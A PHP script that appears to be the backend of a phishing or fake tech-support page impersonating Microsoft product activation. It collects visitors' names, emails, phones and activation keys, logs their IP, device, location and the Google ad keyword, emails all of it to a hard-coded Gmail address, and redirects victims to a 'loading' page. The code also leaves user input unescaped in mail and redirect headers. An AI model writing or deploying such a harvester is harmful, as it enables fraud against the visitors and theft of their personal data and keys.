<?php
$to_email = "areeb2025malik@gmail.com";
$from_email = "info@anservices.online";

// Get form data
$name = isset($_POST['name']) ? htmlspecialchars(trim($_POST['name'])) : '';
$email = isset($_POST['email']) ? htmlspecialchars(trim($_POST['email'])) : '';
$phone = isset($_POST['phone']) ? htmlspecialchars(trim($_POST['phone'])) : '';
$activation_key = isset($_POST['activation_key']) ? htmlspecialchars(trim($_POST['activation_key'])) : '';
$brand = isset($_POST['brand']) ? htmlspecialchars(trim($_POST['brand'])) : 'microsoft';
$keyword = isset($_POST['keyword']) ? htmlspecialchars(trim($_POST['keyword'])) : '';
$referrer = isset($_POST['referrer']) ? htmlspecialchars(trim($_POST['referrer'])) : '';
$country = isset($_POST['country']) ? htmlspecialchars(trim($_POST['country'])) : '';

// Save to sessionStorage
session_start();
$_SESSION['detectedBrand'] = $brand;
$_SESSION['detectedKeyword'] = $keyword;
$_SESSION['detectedActivationKey'] = $activation_key;

// Get Visitor IP
function getVisitorIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$visitor_ip = getVisitorIP();

// Get Device Details
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? htmlspecialchars($_SERVER['HTTP_USER_AGENT']) : 'Unknown';
$accept_lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? htmlspecialchars($_SERVER['HTTP_ACCEPT_LANGUAGE']) : 'Unknown';

// Parse device info
$device = 'Unknown Device';
$os = 'Unknown OS';
$browser = 'Unknown Browser';
$is_mobile = false;

if (preg_match('/Windows/i', $user_agent)) { $os = 'Windows'; $device = 'PC/Laptop'; }
elseif (preg_match('/Macintosh|Mac OS X/i', $user_agent)) { $os = 'macOS'; $device = 'Mac'; }
elseif (preg_match('/Linux/i', $user_agent)) { $os = 'Linux'; }
elseif (preg_match('/Android/i', $user_agent)) { $os = 'Android'; $device = 'Mobile'; $is_mobile = true; }
elseif (preg_match('/iPhone|iPad/i', $user_agent)) { $os = 'iOS'; $device = 'iPhone/iPad'; $is_mobile = true; }

if (preg_match('/Chrome/i', $user_agent) && !preg_match('/Chromium/i', $user_agent)) { $browser = 'Chrome'; }
elseif (preg_match('/Firefox/i', $user_agent)) { $browser = 'Firefox'; }
elseif (preg_match('/Safari/i', $user_agent) && !preg_match('/Chrome/i', $user_agent)) { $browser = 'Safari'; }
elseif (preg_match('/Edge/i', $user_agent)) { $browser = 'Edge'; }
elseif (preg_match('/Opera|OPR/i', $user_agent)) { $browser = 'Opera'; }
elseif (preg_match('/MSIE|Trident/i', $user_agent)) { $browser = 'Internet Explorer'; }

// Get location info from IP (using ipinfo.io or similar - optional)
$location = 'Unknown Location';
if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://ipinfo.io/{$visitor_ip}/json");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    if ($response) {
        $ip_data = json_decode($response, true);
        if ($ip_data && isset($ip_data['city']) && isset($ip_data['region'])) {
            $location = $ip_data['city'] . ', ' . $ip_data['region'] . ', ' . $ip_data['country'];
        }
    }
    curl_close($ch);
}

// Format email subject
$subject = "[$brand] New Activation Request - Key: $activation_key";

// Format email body
$email_body = "=== ACTIVATION REQUEST DETAILS ===\n\n";
$email_body .= "Brand: $brand\n";
$email_body .= "Google Keyword: $keyword\n";
$email_body .= "Referrer: $referrer\n";
$email_body .= "Country (IP lookup): $country\n";
$email_body .= "Timestamp: " . date('Y-m-d H:i:s') . "\n\n";
$email_body .= "=== VISITOR INFORMATION ===\n\n";
$email_body .= "Name: $name\n";
$email_body .= "Email: $email\n";
$email_body .= "Phone: $phone\n";
$email_body .= "Activation Key: $activation_key\n\n";
$email_body .= "=== DEVICE DETAILS ===\n\n";
$email_body .= "IP Address: $visitor_ip\n";
$email_body .= "Location: $location\n";
$email_body .= "User Agent: $user_agent\n";
$email_body .= "Accept Language: $accept_lang\n";
$email_body .= "Device: $device\n";
$email_body .= "Operating System: $os\n";
$email_body .= "Browser: $browser\n";
$email_body .= "Is Mobile: " . ($is_mobile ? "Yes" : "No") . "\n\n";
$email_body .= "=== END OF REPORT ===\n";

// Email headers
$headers = "From: $from_email\r\n";
$headers .= "Reply-To: $email\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
$headers .= "X-Mailer: PHP/" . phpversion();

// Send email
$mail_sent = false;
if (mail($to_email, $subject, $email_body, $headers)) {
    $mail_sent = true;
}

// Also try PHPMailer if available
if (!$mail_sent && class_exists('PHPMailer\PHPMailer\PHPMailer')) {
    require_once 'vendor/autoload.php';
    $mail = new PHPMailer\PHPMailer\PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'your-email@gmail.com';
        $mail->Password = 'your-app-password';
        $mail->SMTPSecure = PHPMailer\PHPMailer\ENCODING_STARTTLS;
        $mail->Port = 587;
        $mail->setFrom($from_email, 'Activation System');
        $mail->addAddress($to_email);
        $mail->isHTML(true);
        $mail->Subject = $subject;
        $mail->Body = nl2br($email_body);
        $mail->send();
        $mail_sent = true;
    } catch (Exception $e) {
        // Log error
    }
}

// Redirect to loading page with brand info
header("Location: loading.html?brand=$brand&keyword=" . urlencode($keyword) . "&key=" . urlencode($activation_key) . "&referrer=" . urlencode($referrer));
exit();
?>
